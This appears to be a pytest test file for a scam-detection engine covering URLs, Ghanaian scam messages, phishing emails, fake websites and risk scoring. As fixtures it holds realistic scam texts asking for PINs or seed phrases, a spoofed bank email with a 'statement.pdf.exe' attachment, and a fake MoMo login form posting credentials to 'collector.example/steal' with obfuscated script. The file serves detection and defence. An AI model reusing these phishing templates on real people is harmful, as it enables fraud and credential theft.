"""Detection engine units: URL parsing, impersonation, message rules, email, scoring."""

import pytest

from app.detection import email_analysis, scoring, text, urls, website
from app.detection.brands import CATALOGUE, match_host

BRANDS = list(CATALOGUE)


def codes(signals):
    return {s.code for s in signals}


# --- URLs ------------------------------------------------------------------------------------


def test_canonicalisation_redacts_secrets_and_drops_fragments():
    u = urls.parse_url("HTTPS://Login.Example.COM:443/a/../reset?token=abc123&x=1#frag")
    assert u.host == "login.example.com" and u.port is None
    assert "abc123" not in u.canonical and "token=REDACTED" in u.canonical
    assert "#" not in u.canonical
    assert u.lookup_url == "https://login.example.com/a/../reset"  # query stripped for providers
    assert u.registrable == "example.com"


def test_bare_domains_ghana_suffixes_and_hosting_platforms():
    assert urls.parse_url("www.gcbbank.com.gh/login").registrable == "gcbbank.com.gh"
    assert urls.parse_url("mtn-momo.web.app").registrable == "mtn-momo.web.app"
    assert urls.parse_url("http://3232235777/").host == "192.168.1.1"


@pytest.mark.parametrize("bad", ["", "ftp://x.com", "http://", "not a url at all"])
def test_invalid_urls_are_refused(bad):
    with pytest.raises(urls.InvalidURL):
        urls.parse_url(bad)


def test_official_domain_is_positive_but_lookalikes_are_flagged():
    official = urls.analyse_url(urls.parse_url("https://www.mtn.com.gh/momo"), BRANDS)
    assert "official_domain" in codes(official)
    assert "brand_impersonation_domain" not in codes(official)

    fake = urls.analyse_url(urls.parse_url("http://mtn-momo-reversal.xyz/verify"), BRANDS)
    sig = next(s for s in fake if s.code == "brand_impersonation_domain")
    assert sig.data["brand"] == "MTN Mobile Money" and sig.weight >= 50
    assert {"risky_tld"} <= codes(fake)

    look = match_host("gcbbamk.com", BRANDS)
    assert look and look.how == "lookalike" and look.brand.name == "GCB Bank"
    assert match_host("ecobank.com", BRANDS) is None  # the real thing
    hyphenated = match_host("gcbbamk-secure.xyz", BRANDS)
    assert hyphenated and hyphenated.brand.name == "GCB Bank"


def test_short_brand_words_need_a_whole_token():
    # "gra" inside "graphics" or "telegram" must not look like the tax authority.
    assert match_host("graphicsghana.com", BRANDS) is None
    assert match_host("telegram.org", BRANDS) is None
    assert match_host("gra-refund.com", BRANDS).brand.name == "Ghana Revenue Authority"


def test_url_tricks():
    assert "userinfo_trick" in codes(
        urls.analyse_url(urls.parse_url("http://ecobank.com@evil.example/"), BRANDS)
    )
    assert "ip_address_host" in codes(urls.analyse_url(urls.parse_url("http://8.8.8.8/x"), BRANDS))
    assert "url_shortener" in codes(urls.analyse_url(urls.parse_url("https://bit.ly/abc"), BRANDS))
    assert "dangerous_scheme" in codes(
        urls.analyse_url(urls.parse_url("javascript:alert(1)"), BRANDS)
    )
    homograph = urls.analyse_url(urls.parse_url("https://xn--pypal-4ve.com/"), BRANDS)
    assert codes(homograph) & {"idn_homograph", "punycode_domain"}


def test_extracts_links_from_text_without_grabbing_email_addresses():
    found = urls.extract_urls(
        "Click mtn-momo.xyz/rev now or https://bit.ly/x. Contact info@shop.com."
    )
    assert "mtn-momo.xyz/rev" in found and "https://bit.ly/x" in found
    assert not any("info@" in f for f in found)


# --- Messages --------------------------------------------------------------------------------

MOMO_SCAM = (
    "MTN MoMo: GHS 450.00 was sent to your wallet by mistake. Please reverse it immediately "
    "by dialing *170# and enter your PIN to approve, or your account will be blocked within "
    "24 hours. Call 0244123456."
)


def test_momo_reversal_scam_is_recognised():
    analysis = text.analyse_text(MOMO_SCAM, BRANDS, sender="0551234567")
    found = codes(analysis.signals)
    assert {"momo_reversal", "approve_prompt", "account_threat", "urgency"} <= found
    assert "brand_from_personal_number" in found
    assert analysis.extracted.phones == ["+233244123456"]
    assert analysis.extracted.shortcodes == ["*170#"]
    result = scoring.assess("message", analysis.signals)
    assert result.verdict in {"high", "critical"} and result.category == "momo"
    assert any("PIN" in r for r in result.recommendations)


def test_genuine_otp_messages_are_not_flagged_as_credential_theft():
    analysis = text.analyse_text(
        "Your verification code is 482913. Do not share this code with anyone.", BRANDS
    )
    assert "credential_request" not in codes(analysis.signals)
    assert "otp_message" in codes(analysis.signals)
    assert "482913" not in analysis.redacted_text


def test_redaction_removes_codes_pins_passwords_and_cards():
    red, removed = text.redact(
        "OTP 123456. password: hunter2. Card 4111 1111 1111 1111. Ref 7654321."
    )
    assert "123456" not in red and "hunter2" not in red and "4111" not in red
    assert set(removed) == {"one_time_code", "password", "card_number"}


@pytest.mark.parametrize(
    ("message", "rule"),
    [
        ("Your parcel is on hold at customs. Pay the clearance fee of GHS 20 here", "fee_request"),
        ("Congratulations! You have won GHS 5,000 in our promo. Claim your prize", "prize"),
        ("Invest GHS 500 today and get guaranteed returns of 40% weekly", "investment_promise"),
        ("Send me your seed phrase to unlock your USDT airdrop", "seed_phrase_request"),
        ("GRA: you have an outstanding tax penalty. Pay now to avoid arrest", "government_payment"),
        ("Admission confirmed. Pay your acceptance fee before the deadline", "university_fee"),
        ("Mum I'm stuck at the hospital, please send money on momo urgently", "emergency_money"),
    ],
)
def test_ghana_scam_patterns(message, rule):
    assert rule in codes(text.analyse_text(message, BRANDS).signals)


def test_ordinary_messages_are_unknown_not_safe():
    analysis = text.analyse_text("Hi Kofi, are we still meeting at 3pm tomorrow?", BRANDS)
    result = scoring.assess("message", analysis.signals)
    assert result.verdict == "unknown"
    assert "not proof" in result.headline


# --- Email -----------------------------------------------------------------------------------

RAW_EMAIL = """From: "GCB Bank Security" <alerts@gcb-secure-mail.com>
Reply-To: helpdesk.gcb@gmail.com
Return-Path: <bounce@mailer.example.net>
To: customer@example.com
Subject: Urgent: verify your account
Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=gcb-secure-mail.com;
 dkim=none; dmarc=fail
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b1"

--b1
Content-Type: text/html; charset=utf-8

<p>Your account will be suspended within 24 hours. <a href="http://gcb-verify.xyz/login">https://www.gcbbank.com.gh/secure</a></p>
--b1
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="statement.pdf.exe"

AAAA
--b1--
"""


def test_email_headers_links_and_attachments():
    parsed = email_analysis.parse_email(RAW_EMAIL)
    assert parsed.has_headers and parsed.auth == {"spf": "fail", "dkim": "none", "dmarc": "fail"}
    assert parsed.attachments[0].filename == "statement.pdf.exe"
    found = codes(email_analysis.analyse_email(parsed, BRANDS))
    assert {
        "lookalike_sender_domain",
        "reply_to_mismatch",
        "spf_fail",
        "dmarc_fail",
        "link_text_mismatch",
        "risky_attachment",
    } <= found


def test_authentication_passing_is_never_treated_as_proof():
    parsed = email_analysis.parse_email(
        "From: a@shop.example\nSubject: Hi\nAuthentication-Results: x; spf=pass; dkim=pass; "
        "dmarc=pass\n\nHello"
    )
    sig = next(s for s in email_analysis.analyse_email(parsed, BRANDS) if s.code == "auth_results")
    assert sig.weight == 0 and "scammers can pass" in sig.description


# --- Website ---------------------------------------------------------------------------------


def fake_fetch(body: str, final="https://mtn-momo-verify.xyz/login", **extra):
    return {
        "requested_url": "https://bit.ly/abc",
        "ok": True,
        "final_url": final,
        "status": 200,
        "content_type": "text/html",
        "headers": {},
        "body": body,
        "hops": [
            {"url": "https://bit.ly/abc", "status": 301, "location": final},
            {"url": final, "status": 200, "location": None},
        ],
        "tls": {
            "trusted": True,
            "certificate": {"issuer": "R3", "not_before": "2020-01-01T00:00:00+00:00"},
        },
        **extra,
    }


def test_fake_login_page_is_credential_harvesting():
    page = """<html><title>MTN MoMo - Secure Login</title><body>
      <form action="https://collector.example/steal" method="post">
        <input name="msisdn" placeholder="Phone number"><input type="password" name="pin">
      </form><script>eval(atob('YWxlcnQoMSk='))</script></body></html>"""
    signals, facts = website.analyse_fetch(fake_fetch(page), BRANDS)
    found = codes(signals)
    assert {
        "credential_harvest",
        "form_posts_elsewhere",
        "cross_domain_redirect",
        "obfuscated_code",
    } <= found
    assert facts["password_fields"] == 1 and facts["title"].startswith("MTN MoMo")


def test_private_network_and_unreachable_sites():
    signals, _ = website.analyse_fetch({"ok": False, "unsafe": True, "error": "private"}, BRANDS)
    assert codes(signals) == {"points_to_private_network"}
    signals, _ = website.analyse_fetch({"ok": False, "error": "timeout", "hops": []}, BRANDS)
    assert codes(signals) == {"unreachable"} and signals[0].weight == 0


def test_apk_downloads_are_flagged():
    fetched = fake_fetch(
        "",
        final="https://bank-update.example/app.apk",
        download=True,
        content_type="application/vnd.android.package-archive",
    )
    assert "file_download" in codes(website.analyse_fetch(fetched, BRANDS)[0])


# --- Scoring ---------------------------------------------------------------------------------


def test_scores_have_diminishing_returns_and_confidence():
    from app.detection.signals import Signal

    one = scoring.combine([Signal("message", "a", "t", "d", 50)])
    same_layer = scoring.combine(
        [Signal("message", "a", "t", "d", 50), Signal("message", "b", "t", "d", 50)]
    )
    two_layers = scoring.combine(
        [Signal("message", "a", "t", "d", 50), Signal("domain", "b", "t", "d", 50)]
    )
    assert one == 50 and one < same_layer < two_layers <= 75


def test_verified_intelligence_is_critical_and_beats_official_domain():
    from app.detection.signals import Signal

    verified = Signal(
        "reputation", "verified_indicator", "t", "d", 95, source_kind="verified_intel"
    )
    positive = Signal("positive", "official_domain", "t", "d", 0)
    result = scoring.assess("url", [verified, positive])
    assert result.verdict == "critical" and result.confidence == "high"
    assert scoring.assess("url", [positive]).verdict == "low"
